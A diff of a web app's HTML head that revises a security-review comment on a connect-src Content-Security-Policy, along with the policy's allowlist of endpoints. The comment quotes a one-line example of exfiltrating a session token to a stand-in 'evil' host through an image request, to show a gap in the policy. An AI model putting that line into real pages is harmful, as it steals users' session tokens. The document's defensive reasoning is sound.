@@ -4,13 +4,17 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
 <meta name="referrer" content="strict-origin-when-cross-origin">
-<!-- Content-Security-Policy (security review F4/F5): a connect-src allowlist so an injected script can't
-     exfiltrate the session/operator token to a non-app host — even with inline onX= handlers present.
-     connect-src ONLY (no default-src) → scripts/styles/the Tailwind CDN/inline handlers are unaffected.
-     Every real client endpoint MUST be listed or sync/calendar/billing break: the Worker (prod/staging/
-     local, https+wss), Google APIs (gapi calendar), Helcim Pay (billing). NOTE: a <meta> CSP can't be
-     Report-Only — verify sync + calendar live before deploying. bo_sync (per-salon dynamic URL) is NOT
-     covered; add its host here if that integration is ever enabled in TurnDesk. -->
+<!-- Content-Security-Policy (security review F4/F5): a connect-src allowlist — DEFENSE-IN-DEPTH, not the
+     primary control. It bounds where fetch/XHR/WebSocket/sendBeacon may connect, so it blocks the
+     fetch-based token exfil in the F4 PoC. It does NOT cover img/script/navigation/form channels: with no
+     default-src, `new Image().src='//evil/?t='+token` or a navigation can still exfil. The PRIMARY F4 fix is
+     the escape-at-render sweep; this CSP just narrows one channel. connect-src ONLY (no default-src) is
+     deliberate → scripts/styles/the Tailwind CDN/inline onX= handlers are unaffected. A fuller policy
+     (default-src/img-src/script-src) is deferred — it needs a header-based Report-Only trial (a <meta> CSP
+     can't be Report-Only) to avoid breaking the CDN + inline handlers. Every real client endpoint MUST be
+     listed or sync/calendar/billing break: the Worker (prod/staging/local, https+wss), Google APIs (gapi
+     calendar), Helcim Pay (billing). Verify sync + calendar LIVE before deploying. bo_sync (per-salon
+     dynamic URL) is NOT covered; add its host here if that integration is ever enabled in TurnDesk. -->
 <meta http-equiv="Content-Security-Policy" content="connect-src 'self' https://turndesk.musenailandspa.workers.dev wss://turndesk.musenailandspa.workers.dev https://turndesk-staging.musenailandspa.workers.dev wss://turndesk-staging.musenailandspa.workers.dev http://localhost:8787 ws://localhost:8787 https://*.googleapis.com https://apis.google.com https://secure.helcim.app">
 <!-- Force browsers to always fetch fresh HTML — prevents stale cached versions after deploys -->
 <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
